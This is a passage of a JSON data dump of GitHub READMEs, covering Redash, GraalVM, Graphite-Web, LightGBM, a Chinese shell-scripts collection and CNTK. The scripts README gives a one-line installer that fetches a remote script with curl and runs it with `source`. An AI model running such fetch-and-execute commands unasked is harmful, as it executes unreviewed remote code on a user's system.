them](https:\/\/github.com\/vinta\/awesome-python\/pulls) by adding :+1: to them. Pull requests will be merged when their votes reach **20**.\n\n- - -\n\nIf you have any question about this opinionated list, do not hesitate to contact me [@vinta](https:\/\/twitter.com\/vinta) on Twitter or open an issue on GitHub.\n"},{"repo":"\/getredash\/redash","language":"JavaScript","readme_contents":"<p align=\"center\">\n  <img title=\"Redash\" src='https:\/\/redash.io\/assets\/images\/logo.png' width=\"200px\"\/>\n<\/p>\n\n[![Documentation](https:\/\/img.shields.io\/badge\/docs-redash.io\/help-brightgreen.svg)](https:\/\/redash.io\/help\/)\n[![Datree](https:\/\/s3.amazonaws.com\/catalog.static.datree.io\/datree-badge-20px.svg)](https:\/\/datree.io\/?src=badge)\n[![Build Status](https:\/\/circleci.com\/gh\/getredash\/redash.png?style=shield&circle-token=8a695aa5ec2cbfa89b48c275aea298318016f040)](https:\/\/circleci.com\/gh\/getredash\/redash\/tree\/master)\n\n**_Redash_** is our take on freeing the data within our company in a way that will better fit our culture and usage patterns.\n\nPrior to **_Redash_**, we tried to use traditional BI suites and discovered a set of bloated, technically challenged and slow tools\/flows. What we were looking for was a more hacker'ish way to look at data, so we built one.\n\n**_Redash_** was built to allow fast and easy access to billions of records, that we process and collect using Amazon Redshift (\"petabyte scale data warehouse\" that \"speaks\" PostgreSQL).\nToday **_Redash_** has support for querying multiple databases, including: Redshift, Google BigQuery, PostgreSQL, MySQL, Graphite, Presto, Google Spreadsheets, Cloudera Impala, Hive and custom scripts.\n\n**_Redash_** consists of two parts:\n\n1. **Query Editor**: think of [JS Fiddle](https:\/\/jsfiddle.net) for SQL queries. It's your way to share data in the organization in an open way, by sharing both the dataset and the query that generated it. This way everyone can peer review not only the resulting dataset but also the process that generated it. Also it's possible to fork it and generate new datasets and reach new insights.\n2. **Visualizations and Dashboards**: once you have a dataset, you can create different visualizations out of it, and then combine several visualizations into a single dashboard. Currently Redash supports charts, pivot table, cohorts and [more](https:\/\/redash.io\/help\/user-guide\/visualizations\/visualization-types).\n\n<img src=\"https:\/\/raw.githubusercontent.com\/getredash\/website\/8e820cd02c73a8ddf4f946a9d293c54fd3fb08b9\/website\/_assets\/images\/redash-anim.gif\" width=\"80%\"\/>\n\n## Getting Started\n\n* [Setting up Redash instance](https:\/\/redash.io\/help\/open-source\/setup) (includes links to ready made AWS\/GCE images).\n* [Documentation](https:\/\/redash.io\/help\/).\n\n## Supported Data Sources\n\nRedash supports more than 35 [data sources](https:\/\/redash.io\/help\/data-sources\/supported-data-sources). \n\n## Getting Help\n\n* Issues: https:\/\/github.com\/getredash\/redash\/issues\n* Discussion Forum: https:\/\/discuss.redash.io\/\n\n## Reporting Bugs and Contributing Code\n\n* Want to report a bug or request a feature? Please open [an issue](https:\/\/github.com\/getredash\/redash\/issues\/new).\n* Want to help us build **_Redash_**? Fork the project, edit in a [dev environment](https:\/\/redash.io\/help-onpremise\/dev\/guide.html), and make a pull request. We need all the help we can get!\n\n## Security\n\nPlease email security@redash.io to report any security vulnerabilities. We will acknowledge receipt of your vulnerability and strive to send you regular updates about our progress. If you're curious about the status of your disclosure please feel free to email us again. If you want to encrypt your disclosure email, you can use [this PGP key](https:\/\/keybase.io\/arikfr\/key.asc).\n\n## License\n\nBSD-2-Clause.\n"},{"repo":"\/oracle\/graal","language":"Java","readme_contents":"# GraalVM\n\n[![https:\/\/graalvm.slack.com](https:\/\/img.shields.io\/badge\/slack-join%20channel-active)](https:\/\/www.graalvm.org\/slack-invitation\/)\n\nGraalVM is a universal virtual machine for running applications written in JavaScript, Python, Ruby, R, JVM-based languages like Java, Scala, Clojure, Kotlin, and LLVM-based languages such as C and C++.\n\nThe project website at [https:\/\/www.graalvm.org](https:\/\/www.graalvm.org) describes how to [get started](https:\/\/www.graalvm.org\/docs\/getting-started\/), how to [stay connected](https:\/\/www.graalvm.org\/community\/), and how to [contribute](https:\/\/www.graalvm.org\/community\/contributors\/).\n\n## Repository Structure\n\nThe GraalVM main source repository includes the following components:\n\n* [GraalVM SDK](sdk\/README.md) contains long term supported APIs of GraalVM.\n\n* [GraalVM compiler](compiler\/README.md) written in Java that supports both dynamic and static compilation and can integrate with\nthe Java HotSpot VM or run standalone.\n\n* [Truffle](truffle\/README.md) language implementation framework for creating languages and instrumentations for GraalVM.\n\n* [Tools](tools\/README.md) contains a set of tools for GraalVM languages\nimplemented with the instrumentation framework.\n\n* [Substrate VM](substratevm\/README.md) framework that allows ahead-of-time (AOT)\ncompilation of Java applications under closed-world assumption into executable\nimages or shared objects.\n\n* [Sulong](sulong\/README.md) is an engine for running LLVM bitcode on GraalVM.\n\n* [TRegex](regex\/README.md) is an implementation of regular expressions which leverages GraalVM for efficient compilation of automata.\n\n* [VM](vm\/README.md) includes the components to build a modular GraalVM image.\n\n* [VS Code](\/vscode\/README.md) provides extensions to Visual Studio Code that support development of polyglot applications using GraalVM.\n\n## Get Support\n\n* Open a [GitHub issue](https:\/\/github.com\/oracle\/graal\/issues) for bug reports, questions, or requests for enhancements.\n* Report a security vulnerability according to the [Reporting Vulnerabilities guide](https:\/\/www.oracle.com\/corporate\/security-practices\/assurance\/vulnerability\/reporting.html).\n\n## Related Repositories\n\nGraalVM allows running of following languages which are being developed and tested in related repositories with GraalVM core to run on top of it using Truffle and the GraalVM compiler. These are:\n* [GraalJS](https:\/\/github.com\/graalvm\/graaljs) - JavaScript (ECMAScript 2019 compatible) and Node.js 10.16.3\n* [FastR](https:\/\/github.com\/oracle\/fastr) - R Language 3.6.1\n* [GraalPython](https:\/\/github.com\/graalvm\/graalpython) - Python 3.7\n* [TruffleRuby](https:\/\/github.com\/oracle\/truffleruby\/) - Ruby Programming Language 2.6.2\n* [SimpleLanguage](https:\/\/github.com\/graalvm\/simplelanguage) - A simple demonstration language for the GraalVM.\n\n\n## License\n\nEach GraalVM component is licensed:\n* [Truffle Framework](\/truffle\/) and its dependency [GraalVM SDK](\/sdk\/) are licensed under the [Universal Permissive License](truffle\/LICENSE.md).\n* [Tools](\/tools\/) project is licensed under the [GPL 2 with Classpath exception](tools\/LICENSE).\n* [TRegex](\/regex\/) project is licensed under the [Universal Permissive License](regex\/LICENSE.md).\n* [GraalVM compiler](\/compiler\/) is licensed under the [GPL 2 with Classpath exception](compiler\/LICENSE.md).\n* [Substrate VM](\/substratevm\/) is licensed under the [GPL 2 with Classpath exception](substratevm\/LICENSE).\n* [Sulong](\/sulong\/) is licensed under [3-clause BSD](sulong\/LICENSE).\n* [VM](\/vm\/) is licensed under the [GPL 2 with Classpath exception](vm\/LICENSE_GRAALVM_CE).\n* [VS Code](\/vscode\/) extensions are distributed under the [UPL 1.0 license](\/vscode\/graalvm\/LICENSE.txt).\n"},{"repo":"\/graphite-project\/graphite-web","language":"JavaScript","readme_contents":"# Graphite-Web\n\n[![Codacy Badge](https:\/\/api.codacy.com\/project\/badge\/Grade\/5e94ef79c2ea441aaf209cfb2851849e)](https:\/\/www.codacy.com\/app\/graphite-project\/graphite-web?utm_source=github.com&utm_medium=referral&utm_content=graphite-project\/graphite-web&utm_campaign=badger)\n[![Build Status](https:\/\/travis-ci.org\/graphite-project\/graphite-web.png?branch=master)](https:\/\/travis-ci.org\/graphite-project\/graphite-web)\n[![FOSSA Status](https:\/\/app.fossa.io\/api\/projects\/git%2Bhttps%3A%2F%2Fgithub.com%2Fgraphite-project%2Fgraphite-web.svg?type=shield)](https:\/\/app.fossa.io\/projects\/git%2Bhttps%3A%2F%2Fgithub.com%2Fgraphite-project%2Fgraphite-web?ref=badge_shield)\n[![codecov](https:\/\/codecov.io\/gh\/graphite-project\/graphite-web\/branch\/master\/graph\/badge.svg)](https:\/\/codecov.io\/gh\/graphite-project\/graphite-web)\n\n## Overview\n\nGraphite consists of three major components:\n\n1. Graphite-Web, a Django-based web application that renders graphs and dashboards\n2. The [Carbon](https:\/\/github.com\/graphite-project\/carbon) metric processing daemons\n3. The [Whisper](https:\/\/github.com\/graphite-project\/whisper) time-series database library\n\n![Graphite Components](https:\/\/github.com\/graphite-project\/graphite-web\/raw\/master\/webapp\/content\/img\/overview.png \"Graphite Components\")\n\n## Installation, Configuration and Usage\n\nPlease refer to the instructions at [readthedocs](http:\/\/graphite.readthedocs.io\/).\n\n## License\n\nGraphite-Web is licensed under version 2.0 of the Apache License. See the [LICENSE](https:\/\/github.com\/graphite-project\/graphite-web\/blob\/master\/LICENSE) file for details.\n"},{"repo":"\/microsoft\/LightGBM","language":"C++","readme_contents":"LightGBM, Light Gradient Boosting Machine\n=========================================\n\n[![Azure Pipelines Build Status](https:\/\/lightgbm-ci.visualstudio.com\/lightgbm-ci\/_apis\/build\/status\/Microsoft.LightGBM?branchName=master)](https:\/\/lightgbm-ci.visualstudio.com\/lightgbm-ci\/_build\/latest?definitionId=1)\n[![Appveyor Build Status](https:\/\/ci.appveyor.com\/api\/projects\/status\/1ys5ot401m0fep6l\/branch\/master?svg=true)](https:\/\/ci.appveyor.com\/project\/guolinke\/lightgbm\/branch\/master)\n[![Travis Build Status](https:\/\/travis-ci.org\/microsoft\/LightGBM.svg?branch=master)](https:\/\/travis-ci.org\/microsoft\/LightGBM)\n[![Documentation Status](https:\/\/readthedocs.org\/projects\/lightgbm\/badge\/?version=latest)](https:\/\/lightgbm.readthedocs.io\/)\n[![License](https:\/\/img.shields.io\/github\/license\/microsoft\/lightgbm.svg)](https:\/\/github.com\/microsoft\/LightGBM\/blob\/master\/LICENSE)\n[![Python Versions](https:\/\/img.shields.io\/pypi\/pyversions\/lightgbm.svg?logo=python&logoColor=white)](https:\/\/pypi.org\/project\/lightgbm)\n[![PyPI Version](https:\/\/img.shields.io\/pypi\/v\/lightgbm.svg?logo=pypi&logoColor=white)](https:\/\/pypi.org\/project\/lightgbm)\n[![Join Gitter at https:\/\/gitter.im\/Microsoft\/LightGBM](https:\/\/badges.gitter.im\/Microsoft\/LightGBM.svg)](https:\/\/gitter.im\/Microsoft\/LightGBM?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n[![Slack](https:\/\/lightgbm-slack-autojoin.herokuapp.com\/badge.svg)](https:\/\/lightgbm-slack-autojoin.herokuapp.com)\n\nLightGBM is a gradient boosting framework that uses tree based learning algorithms. It is designed to be distributed and efficient with the following advantages:\n\n- Faster training speed and higher efficiency.\n- Lower memory usage.\n- Better accuracy.\n- Support of parallel and GPU learning.\n- Capable of handling large-scale data.\n\nFor further details, please refer to [Features](https:\/\/github.com\/microsoft\/LightGBM\/blob\/master\/docs\/Features.rst).\n\nBenefitting from these advantages, LightGBM is being widely-used in many [winning solutions](https:\/\/github.com\/microsoft\/LightGBM\/blob\/master\/examples\/README.md#machine-learning-challenge-winning-solutions) of machine learning competitions.\n\n[Comparison experiments](https:\/\/github.com\/microsoft\/LightGBM\/blob\/master\/docs\/Experiments.rst#comparison-experiment) on public datasets show that LightGBM can outperform existing boosting frameworks on both efficiency and accuracy, with significantly lower memory consumption. What's more, [parallel experiments](https:\/\/github.com\/microsoft\/LightGBM\/blob\/master\/docs\/Experiments.rst#parallel-experiment) show that LightGBM can achieve a linear speed-up by using multiple machines for training in specific settings.\n\nGet Started and Documentation\n-----------------------------\n\nOur primary documentation is at https:\/\/lightgbm.readthedocs.io\/ and is generated from this repository. If you are new to LightGBM, follow [the installation instructions](https:\/\/lightgbm.readthedocs.io\/en\/latest\/Installation-Guide.html) on that site.\n\nNext you may want to read:\n\n* [**Examples**](https:\/\/github.com\/microsoft\/LightGBM\/tree\/master\/examples) showing command line usage of common tasks.\n* [**Features**](https:\/\/github.com\/microsoft\/LightGBM\/blob\/master\/docs\/Features.rst) and algorithms supported by LightGBM.\n* [**Parameters**](https:\/\/github.com\/microsoft\/LightGBM\/blob\/master\/docs\/Parameters.rst) is an exhaustive list of customization you can make.\n* [**Parallel Learning**](https:\/\/github.com\/microsoft\/LightGBM\/blob\/master\/docs\/Parallel-Learning-Guide.rst) and [**GPU Learning**](https:\/\/github.com\/microsoft\/LightGBM\/blob\/master\/docs\/GPU-Tutorial.rst) can speed up computation.\n* [**Laurae++ interactive documentation**](https:\/\/sites.google.com\/view\/lauraepp\/parameters) is a detailed guide for hyperparameters.\n\nDocumentation for contributors:\n\n* [**How we update readthedocs.io**](https:\/\/github.com\/microsoft\/LightGBM\/blob\/master\/docs\/README.rst).\n* Check out the [**Development Guide**](https:\/\/github.com\/microsoft\/LightGBM\/blob\/master\/docs\/Development-Guide.rst).\n\n\nNews\n----\n\nPlease refer to changelogs at [GitHub releases](https:\/\/github.com\/microsoft\/LightGBM\/releases) page.\n\nSome old update logs are available at [Key Events](https:\/\/github.com\/microsoft\/LightGBM\/blob\/master\/docs\/Key-Events.md) page.\n\nExternal (Unofficial) Repositories\n----------------------------------\n\nJulia-package: https:\/\/github.com\/Allardvm\/LightGBM.jl\n\nJPMML (Java PMML converter): https:\/\/github.com\/jpmml\/jpmml-lightgbm\n\nTreelite (model compiler for efficient deployment): https:\/\/github.com\/dmlc\/treelite\n\nm2cgen (model appliers for various languages): https:\/\/github.com\/BayesWitnesses\/m2cgen\n\nleaves (Go model applier): https:\/\/github.com\/dmitryikh\/leaves\n\nONNXMLTools (ONNX converter): https:\/\/github.com\/onnx\/onnxmltools\n\nSHAP (model output explainer): https:\/\/github.com\/slundberg\/shap\n\nMMLSpark (LightGBM on Spark): https:\/\/github.com\/Azure\/mmlspark\n\nKubeflow Fairing (LightGBM on Kubernetes): https:\/\/github.com\/kubeflow\/fairing\n\nML.NET (.NET\/C#-package): https:\/\/github.com\/dotnet\/machinelearning\n\nLightGBM.NET (.NET\/C#-package): https:\/\/github.com\/rca22\/LightGBM.Net\n\nDask-LightGBM (distributed and parallel Python-package): https:\/\/github.com\/dask\/dask-lightgbm\n\nRuby gem: https:\/\/github.com\/ankane\/lightgbm\n\nSupport\n-------\n\n* Ask a question [on Stack Overflow with the `lightgbm` tag](https:\/\/stackoverflow.com\/questions\/ask?tags=lightgbm), we monitor this for new questions.\n* Discuss on the [LightGBM Gitter](https:\/\/gitter.im\/Microsoft\/LightGBM).\n* Discuss on the [LightGBM Slack team](https:\/\/lightgbm.slack.com).\n  * Use [this invite link](https:\/\/lightgbm-slack-autojoin.herokuapp.com\/) to join the team.\n* Open **bug reports** and **feature requests** (not questions) on [GitHub issues](https:\/\/github.com\/microsoft\/LightGBM\/issues).\n\nHow to Contribute\n-----------------\n\nLightGBM has been developed and used by many active community members. Your help is very valuable to make it better for everyone.\n\n- Contribute to the [tests](https:\/\/github.com\/microsoft\/LightGBM\/tree\/master\/tests) to make it more reliable.\n- Contribute to the [documentation](https:\/\/github.com\/microsoft\/LightGBM\/tree\/master\/docs) to make it clearer for everyone.\n- Contribute to the [examples](https:\/\/github.com\/microsoft\/LightGBM\/tree\/master\/examples) to share your experience with other users.\n- Look for [issues with tag \"help wanted\"](https:\/\/github.com\/microsoft\/LightGBM\/issues?q=is%3Aissue+is%3Aopen+label%3A%22help+wanted%22) and submit pull requests to address them.\n- Add your stories and experience to [Awesome LightGBM](https:\/\/github.com\/microsoft\/LightGBM\/blob\/master\/examples\/README.md). If LightGBM helped you in a machine learning competition or some research application, we want to hear about it!\n- [Open an issue](https:\/\/github.com\/microsoft\/LightGBM\/issues) to report problems or recommend new features.\n\nMicrosoft Open Source Code of Conduct\n-------------------------------------\n\nThis project has adopted the [Microsoft Open Source Code of Conduct](https:\/\/opensource.microsoft.com\/codeofconduct\/). For more information see the [Code of Conduct FAQ](https:\/\/opensource.microsoft.com\/codeofconduct\/faq\/) or contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.\n\nReference Papers\n----------------\n\nGuolin Ke, Qi Meng, Thomas Finley, Taifeng Wang, Wei Chen, Weidong Ma, Qiwei Ye, Tie-Yan Liu. \"[LightGBM: A Highly Efficient Gradient Boosting Decision Tree](https:\/\/papers.nips.cc\/paper\/6907-lightgbm-a-highly-efficient-gradient-boosting-decision-tree)\". Advances in Neural Information Processing Systems 30 (NIPS 2017), pp. 3149-3157.\n\nQi Meng, Guolin Ke, Taifeng Wang, Wei Chen, Qiwei Ye, Zhi-Ming Ma, Tie-Yan Liu. \"[A Communication-Efficient Parallel Algorithm for Decision Tree](http:\/\/papers.nips.cc\/paper\/6380-a-communication-efficient-parallel-algorithm-for-decision-tree)\". Advances in Neural Information Processing Systems 29 (NIPS 2016), pp. 1279-1287.\n\nHuan Zhang, Si Si and Cho-Jui Hsieh. \"[GPU Acceleration for Large-scale Tree Boosting](https:\/\/arxiv.org\/abs\/1706.08359)\". SysML Conference, 2018.\n\n**Note**: If you use LightGBM in your GitHub projects, please add `lightgbm` in the `requirements.txt`.\n\nLicense\n-------\n\nThis project is licensed under the terms of the MIT license. See [LICENSE](https:\/\/github.com\/microsoft\/LightGBM\/blob\/master\/LICENSE) for additional details.\n"},{"repo":"\/oldratlee\/useful-scripts","language":"Shell","readme_contents":"\ud83d\udc0c useful-scripts\n====================================\n\n<img src=\"docs\/script-logo.png\" width=\"20%\" align=\"right\" \/>\n\n[![License](https:\/\/img.shields.io\/badge\/license-Apache%202-4EB1BA.svg)](https:\/\/www.apache.org\/licenses\/LICENSE-2.0.html)\n[![Join the chat at https:\/\/gitter.im\/oldratlee\/useful-scripts](https:\/\/badges.gitter.im\/oldratlee\/useful-scripts.svg)](https:\/\/gitter.im\/oldratlee\/useful-scripts?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n[![GitHub release](https:\/\/img.shields.io\/github\/release\/oldratlee\/useful-scripts.svg)](https:\/\/github.com\/oldratlee\/useful-scripts\/releases)\n[![GitHub stars](https:\/\/img.shields.io\/github\/stars\/oldratlee\/useful-scripts.svg?style=social&label=Star&)](https:\/\/github.com\/oldratlee\/useful-scripts\/stargazers)\n[![GitHub forks](https:\/\/img.shields.io\/github\/forks\/oldratlee\/useful-scripts.svg?style=social&label=Fork&)](https:\/\/github.com\/oldratlee\/useful-scripts\/fork)\n\n\n\ud83d\udc49 \u628a\u5e73\u65f6\u6709\u7528\u7684\u624b\u52a8\u64cd\u4f5c\u505a\u6210\u811a\u672c\uff0c\u8fd9\u6837\u53ef\u4ee5\u4fbf\u6377\u7684\u4f7f\u7528\u3002 \u2728\n\n\u6709\u81ea\u5df1\u7528\u7684\u597d\u7684\u811a\u672c \u6216\u662f \u5e73\u65f6\u5e38\u7528\u4f46\u6ca1\u6709\u5199\u6210\u811a\u672c\u7684\u529f\u80fd\uff0c\u6b22\u8fce\u63d0\u4f9b\uff08[\u63d0\u4ea4Issue](https:\/\/github.com\/oldratlee\/useful-scripts\/issues))\u548c\u5206\u4eab\uff08[Fork\u540e\u63d0\u4ea4\u4ee3\u7801](https:\/\/github.com\/oldratlee\/useful-scripts\/fork)\uff09\uff01 \ud83d\udc96\n\nPS\uff1a\n\n\u672c\u4ed3\u5e93\u7684\u811a\u672c\uff08\u5982`Java`\u76f8\u5173\u811a\u672c\uff09\u5728\u963f\u91cc\u7b49\u516c\u53f8\uff08\u5982\u968f\u8eab\u4e91\uff0c\u89c1[`awesome-scripts`\u4ed3\u5e93](https:\/\/github.com\/Suishenyun\/awesome-scripts)\u8bf4\u660e\uff09\u7684\u7ebf\u4e0a\u751f\u4ea7\u73af\u5883\u90e8\u7f72\u4f7f\u7528\u3002  \n\u5982\u679c\u4f60\u7684\u516c\u53f8\u6709\u90e8\u7f72\u4f7f\u7528\uff0c\u6b22\u8fce\u4f7f\u7528\u901a\u8fc7[\u63d0\u4ea4Issue](https:\/\/github.com\/oldratlee\/useful-scripts\/issues)\u544a\u77e5\uff0c\u65b9\u4fbf\u4e92\u76f8\u4ea4\u6d41\u53cd\u9988\uff5e \ud83d\udc98\n\n\ud83d\udd30 \u5feb\u901f\u4e0b\u8f7d&\u4f7f\u7528\n----------------------\n\n```bash\nsource <(curl -fsSL https:\/\/raw.githubusercontent.com\/oldratlee\/useful-scripts\/release-2.x\/test-cases\/self-installer.sh)\n```\n\n\u66f4\u591a\u4e0b\u8f7d&\u4f7f\u7528\u65b9\u5f0f\uff0c\u53c2\u89c1[\u4e0b\u8f7d\u4f7f\u7528](docs\/install.md)\u3002\n\n\ud83d\udcda \u4f7f\u7528\u6587\u6863\n----------------------\n\n### \u2615 [`Java`\u76f8\u5173\u811a\u672c](docs\/java.md)\n\n1. [show-busy-java-threads](docs\/java.md#-show-busy-java-threads)  \n    \u7528\u4e8e\u5feb\u901f\u6392\u67e5`Java`\u7684`CPU`\u6027\u80fd\u95ee\u9898(`top us`\u503c\u8fc7\u9ad8)\uff0c\u81ea\u52a8\u67e5\u51fa\u8fd0\u884c\u7684`Java`\u8fdb\u7a0b\u4e2d\u6d88\u8017`CPU`\u591a\u7684\u7ebf\u7a0b\uff0c\u5e76\u6253\u5370\u51fa\u5176\u7ebf\u7a0b\u6808\uff0c\u4ece\u800c\u786e\u5b9a\u5bfc\u81f4\u6027\u80fd\u95ee\u9898\u7684\u65b9\u6cd5\u8c03\u7528\u3002\n1. [show-duplicate-java-classes](docs\/java.md#-show-duplicate-java-classes)  \n    \u627e\u51fa`jar`\u6587\u4ef6\u548c`class`\u76ee\u5f55\u4e2d\u7684\u91cd\u590d\u7c7b\u3002\u7528\u4e8e\u6392\u67e5`Java`\u7c7b\u51b2\u7a81\u95ee\u9898\u3002\n1. [find-in-jars](docs\/java.md#-find-in-jars)  \n    \u5728\u76ee\u5f55\u4e0b\u6240\u6709`jar`\u6587\u4ef6\u91cc\uff0c\u67e5\u627e\u7c7b\u6216\u8d44\u6e90\u6587\u4ef6\u3002\n\n### \ud83d\udc1a [`Shell`\u76f8\u5173\u811a\u672c](docs\/shell.md)\n\n`Shell`\u4f7f\u7528\u52a0\u5f3a\uff1a\n\n1. [c](docs\/shell.md#-c)  \n    \u539f\u6837\u547d\u4ee4\u884c\u8f93\u51fa\uff0c\u5e76\u62f7\u8d1d\u6807\u51c6\u8f93\u51fa\u5230\u7cfb\u7edf\u526a\u8d34\u677f\uff0c\u7701\u53bb`CTRL+C`\u64cd\u4f5c\uff0c\u4f18\u5316\u547d\u4ee4\u884c\u4e0e\u5176\u5b83\u5e94\u7528\u4e4b\u95f4\u7684\u64cd\u4f5c\u6d41\u3002\n1. [coat](docs\/shell.md#-coat)  \n    \u5f69\u8272`cat`\u51fa\u6587\u4ef6\u884c\uff0c\u65b9\u4fbf\u4eba\u773c\u533a\u5206\u4e0d\u540c\u7684\u884c\u3002\n1. [a2l](docs\/shell.md#-a2l)  \n    \u6309\u884c\u5f69\u8272\u8f93\u51fa\u53c2\u6570\uff0c\u65b9\u4fbf\u4eba\u773c\u67e5\u770b\u3002\n1. [ap and rp](docs\/shell.md#-ap-and-rp)  \n    \u6279\u91cf\u8f6c\u6362\u6587\u4ef6\u8def\u5f84\u4e3a\u7edd\u5bf9\u8def\u5f84\/\u76f8\u5bf9\u8def\u5f84\uff0c\u4f1a\u81ea\u52a8\u8ddf\u8e2a\u94fe\u63a5\u5e76\u89c4\u8303\u5316\u8def\u5f84\u3002\n1. [tcp-connection-state-counter](docs\/shell.md#-tcp-connection-state-counter)  \n    \u7edf\u8ba1\u5404\u4e2a`TCP`\u8fde\u63a5\u72b6\u6001\u7684\u4e2a\u6570\u3002\u7528\u4e8e\u65b9\u4fbf\u6392\u67e5\u7cfb\u7edf\u8fde\u63a5\u8d1f\u8377\u95ee\u9898\u3002\n1. [xpl and xpf](docs\/shell.md#-xpl-and-xpf)  \n    \u5728\u547d\u4ee4\u884c\u4e2d\u5feb\u901f\u5b8c\u6210 \u5728\u6587\u4ef6\u6d4f\u89c8\u5668\u4e2d \u6253\u5f00\/\u9009\u4e2d \u6307\u5b9a\u7684\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u7684\u64cd\u4f5c\uff0c\u4f18\u5316\u547d\u4ee4\u884c\u4e0e\u5176\u5b83\u5e94\u7528\u4e4b\u95f4\u7684\u64cd\u4f5c\u6d41\u3002\n\n`Shell`\u5f00\u53d1\/\u6d4b\u8bd5\u52a0\u5f3a\uff1a\n\n1. [echo-args](docs\/shell.md#-echo-args)  \n    \u8f93\u51fa\u811a\u672c\u6536\u5230\u7684\u53c2\u6570\uff0c\u5728\u63a7\u5236\u53f0\u8fd0\u884c\u65f6\uff0c\u628a\u53c2\u6570\u503c\u62ec\u8d77\u7684\u62ec\u53f7\u663e\u793a\u6210 **\u7ea2\u8272**\uff0c\u65b9\u4fbf\u4eba\u773c\u67e5\u770b\u3002\u7528\u4e8e\u8c03\u8bd5\u811a\u672c\u53c2\u6570\u8f93\u5165\u3002\n1. [console-text-color-themes.sh](docs\/shell.md#-console-text-color-themessh)  \n    \u663e\u793a`Terminator`\u7684\u5168\u90e8\u6587\u5b57\u5f69\u8272\u7ec4\u5408\u7684\u6548\u679c\u53ca\u5176\u6253\u5370\u65b9\u5f0f\uff0c\u7528\u4e8e\u5f00\u53d1`Shell`\u7684\u5f69\u8272\u8f93\u51fa\u3002\n1. [parseOpts.sh](docs\/shell.md#-parseoptssh)  \n    \u547d\u4ee4\u884c\u9009\u9879\u89e3\u6790\u5e93\uff0c\u52a0\u5f3a\u652f\u6301\u9009\u9879\u6709\u591a\u4e2a\u503c\uff08\u5373\u6570\u7ec4\uff09\u3002\n\n### \u231a [`VCS`\u76f8\u5173\u811a\u672c](docs\/vcs.md)\n\n\u76ee\u524d`VCS`\u7684\u811a\u672c\u90fd\u662f`svn`\u5206\u652f\u76f8\u5173\u7684\u64cd\u4f5c\u3002\u4f7f\u7528\u66f4\u73b0\u4ee3\u7684`Git`\u5427\uff01 \ud83d\udca5\n\n\u56e0\u4e3a\u4e0d\u63a8\u8350\u4f7f\u7528`svn`\uff0c\u8fd9\u91cc\u4e0d\u518d\u5217\u51fa\u6709\u54ea\u4e9b\u811a\u672c\u4e86\uff0c\u5982\u679c\u4f60\u6709\u5174\u8da3\u53ef\u4ee5\u70b9\u4e0a\u9762\u94fe\u63a5\u53bb\u770b\u3002\n"},{"repo":"\/microsoft\/CNTK","language":"C++","readme_contents":"## CNTK\n\n| **Chat** | **Windows build status** | **Linux build status** |\n|-------------|-------------|---------------|\n| [![Join the chat at https:\/\/gitter.im\/Microsoft\/CNTK](https:\/\/badges.gitter.im\/Microsoft\/CNTK.svg)](https:\/\/gitter.im\/Microsoft\/CNTK?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge) | [![Build Status](https:\/\/aiinfra.visualstudio.com\/_apis\/public\/build\/definitions\/a95b3960-90bb-440b-bd18-d3ec5d1cf8c3\/126\/badge)](https:\/\/cntk.ai\/nightly-windows.html) | [![Build Status](https:\/\/aiinfra.visualstudio.com\/_apis\/public\/build\/definitions\/a95b3960-90bb-440b-bd18-d3ec5d1cf8c3\/127\/badge)](https:\/\/cntk.ai\/nightly-linux.html) |\n\nThe Microsoft Cognitive Toolkit (https:\/\/cntk.ai) is a unified deep learning toolkit that describes neural networks as a series of computational steps via a directed graph. In this directed graph, leaf nodes represent input values or network parameters, while other nodes represent matrix operations upon their inputs. CNTK allows users to easily realize and combine popular model types such as feed-forward DNNs, convolutional nets (CNNs), and recurrent networks (RNNs\/LSTMs). It implements stochastic gradient descent (SGD, error backpropagation) learning with automatic differentiation and parallelization across multiple GPUs and servers. CNTK has been available under an open-source license since April 2015. It is our hope that the community will take advantage of CNTK to share ideas more quickly through the exchange of open source working code.\n\n## Installation\n\n* [Setup CNTK](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/Setup-CNTK-on-your-machine)\n    * Windows ([Python-only](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/setup-windows-python) \/ [Script-driven](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/setup-windows-binary-script) \/ [Manual](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/setup-windows-binary-manual))\n    * Linux ([Python-only](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/setup-linux-python) \/ [Script-driven](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/setup-linux-binary-script) \/ [Manual](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/setup-linux-binary-manual) \/ [Docker](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/cntk-docker-containers))\n* [CNTK backend for Keras](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/using-cntk-with-keras)\n* [Setup CNTK development environment](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/setup-development-environment)\n    * Windows ([Script-driven](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/setup-cntk-with-script-on-windows) \/ [Manual](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/setup-cntk-on-windows))\n    * Linux ([Manual](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/setup-cntk-on-linux))\n    \n### Installing nightly packages\n\nIf you prefer to use latest CNTK bits from master, use one of the CNTK nightly packages:\n\n* [Nightly packages for Windows](https:\/\/cntk.ai\/nightly-windows.html)\n* [Nightly packages for Linux](https:\/\/cntk.ai\/nightly-linux.html)\n\n## Learning CNTK\n\nYou can learn more about using and contributing to CNTK with the following resources:\n\n* [General documentation](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/)\n* [Python API documentation](https:\/\/cntk.ai\/pythondocs\/)\n* [Evaluation documentation (C++, C#\/.NET, Python, Java)](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/CNTK-Evaluation-Overview)\n* [Manual](https:\/\/github.com\/Microsoft\/CNTK\/tree\/master\/Manual)\n* [Tutorials](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/tutorials)\n* [Examples](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/Examples)\n* [Pretrained 